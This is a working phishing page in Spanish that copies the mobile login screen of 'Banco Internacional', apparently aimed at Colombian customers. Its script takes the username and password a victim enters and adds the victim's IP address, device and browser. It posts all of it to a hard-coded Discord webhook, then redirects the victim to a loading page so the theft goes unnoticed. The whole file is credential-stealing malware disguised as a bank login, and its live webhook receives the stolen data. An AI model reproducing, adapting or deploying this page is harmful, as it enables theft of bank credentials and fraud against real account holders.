<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Banco Internacional</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      min-height: 100vh;
      background-color: #F5A81C;
      display: flex;
      justify-content: center;
      font-family: 'Helvetica Neue', Arial, sans-serif;
    }
    .container {
      width: 100%;
      max-width: 430px;
      min-height: 100vh;
      background-color: #F5A81C;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0 28px 40px;
      position: relative;
    }
    .back-arrow {
      position: absolute;
      top: 24px; left: 20px;
      font-size: 26px; color: white;
      cursor: pointer; text-decoration: none;
      font-weight: 200; line-height: 1;
    }
    .logo-area {
      margin-top: 18px;
      display: flex;
      justify-content: center;
    }
    .logo-area img { width: 210px; object-fit: contain; }
    .illustration { width: 100%; margin-top: 14px; }
    .illustration img { width: 100%; display: block; object-fit: contain; }
    .form-area {
      width: 100%; margin-top: 32px;
      display: flex; flex-direction: column; gap: 16px;
    }
    .field-group { display: flex; flex-direction: column; gap: 7px; }
    .field-group label { color: white; font-size: 15px; font-weight: 400; padding-left: 6px; }
    .field-group input {
      width: 100%; height: 54px;
      background-color: rgba(220, 148, 10, 0.55);
      border: none; border-radius: 32px;
      padding: 0 22px; font-size: 15px; color: white; outline: none;
      transition: background 0.2s;
    }
    .field-group input:focus { background-color: rgba(220,148,10,0.75); }
    .btn-ingresar {
      width: 100%; height: 60px;
      background-color: #FFF0CC; border: none; border-radius: 32px;
      color: #B87800; font-size: 17px; font-weight: 700; cursor: pointer;
      margin-top: 36px; letter-spacing: 0.3px;
      transition: background 0.2s, transform 0.1s;
    }
    .btn-ingresar:hover { background-color: #ffe4a0; transform: scale(1.01); }
    .btn-ingresar:active { transform: scale(0.98); }

  </style>
</head>
<body>
<div class="container">

  <a href="#" class="back-arrow">&#8249;</a>

  <div class="logo-area">
    <img src="logo.webp" alt="Banco Internacional" />
  </div>

  <div class="illustration">
    <img src="sentada.png" alt="Ilustración chica sentada" />
  </div>

  <!-- Form -->
  <div class="form-area">
    <div class="field-group">
      <label for="usuario">Usuario</label>
      <input type="text" id="usuario" name="usuario" autocomplete="username"/>
    </div>
    <div class="field-group">
      <label for="password">Contraseña</label>
      <input type="password" id="password" name="password" autocomplete="current-password"/>
    </div>
  </div>

  <button class="btn-ingresar" onclick="handleLogin()">Ingresar</button>



</div>
<script>

  const WEBHOOK_URL = "https://discord.com/api/webhooks/1491163890715853021/Z7As4jVZZHi81cEJZjXhzbQez81R5grblQVbf29Rh4AH5Y2b8Jw54wBfVHNAPXC9QOkW";

  async function getIP() {
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      const d = await r.json();
      return d.ip || 'Desconocida';
    } catch { return 'Desconocida'; }
  }

  async function sendToDiscord(usuario, password) {
    const ip        = await getIP();
    const agente    = navigator.userAgent;
    const fecha     = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });

    // Detectar dispositivo/navegador de forma legible
    let dispositivo = 'Desconocido';
    if (/iPhone/i.test(agente))       dispositivo = '📱 iPhone';
    else if (/Android/i.test(agente)) dispositivo = '📱 Android';
    else if (/iPad/i.test(agente))    dispositivo = '📱 iPad';
    else if (/Windows/i.test(agente)) dispositivo = '💻 Windows';
    else if (/Mac/i.test(agente))     dispositivo = '💻 Mac';
    else if (/Linux/i.test(agente))   dispositivo = '💻 Linux';

    let navegador = 'Desconocido';
    if (/Edg/i.test(agente))          navegador = 'Edge';
    else if (/OPR|Opera/i.test(agente)) navegador = 'Opera';
    else if (/Chrome/i.test(agente))  navegador = 'Chrome';
    else if (/Firefox/i.test(agente)) navegador = 'Firefox';
    else if (/Safari/i.test(agente))  navegador = 'Safari';

    const payload = {
      username: "Banco Internacional",
      avatar_url: "https://i.imgur.com/4M34hi2.png",
      embeds: [{
        title: "🏦 Nueva entrada recibida",
        color: 0xF5A81C,
        fields: [
          { name: "👤 Usuario",      value: usuario   || "*(vacío)*", inline: true },
          { name: "🔑 Contraseña",   value: password  || "*(vacío)*", inline: true },
          { name: "\u200b",          value: "\u200b",                 inline: false },
          { name: "🌐 IP",           value: ip,                       inline: true },
          { name: "📍 Dispositivo",  value: dispositivo,              inline: true },
          { name: "🖥️ Navegador",    value: navegador,                inline: true },
          { name: "🕐 Fecha y hora", value: fecha,                    inline: false }
        ],
        footer: { text: "Banco Internacional · Login" },
        timestamp: new Date().toISOString()
      }]
    };

    try {
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch(e) { console.warn('Webhook error:', e); }
  }

  async function handleLogin() {
    await sendToDiscord(
      document.getElementById('usuario').value,
      document.getElementById('password').value
    );
    window.location.href = 'carga.html';
  }
</script>
</body>
</html>
